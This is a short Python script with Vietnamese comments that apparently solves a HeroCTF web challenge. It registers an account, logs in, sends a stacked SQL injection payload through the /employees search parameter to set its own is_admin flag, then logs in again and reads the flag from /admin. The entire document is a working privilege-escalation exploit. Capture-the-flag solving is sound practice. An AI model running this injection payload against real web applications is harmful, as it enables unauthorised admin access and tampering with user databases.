import requests

BASE_URL = "https://deploy.heroctf.fr"

# 1. Register
requests.post(f"{BASE_URL}/register", data={
    "username": "hacker",
    "password": "password123"
})

# 2. Login
r = requests.post(f"{BASE_URL}/login", data={
    "username": "hacker", 
    "password": "password123"
}, allow_redirects=False)

cookies = r.cookies

# 3. SQL Injection để set is_admin
requests.get(
    f"{BASE_URL}/employees",
    params={"query": "'; UPDATE users SET is_admin=1 WHERE username='hacker'--"},
    cookies=cookies
)

# 4. Logout và login lại
requests.get(f"{BASE_URL}/logout", cookies=cookies)
r = requests.post(f"{BASE_URL}/login", data={
    "username": "hacker",
    "password": "password123"
}, allow_redirects=False)

new_cookies = r.cookies

# 5. Truy cập /admin để lấy FLAG
r = requests.get(f"{BASE_URL}/admin", cookies=new_cookies)
print(r.text)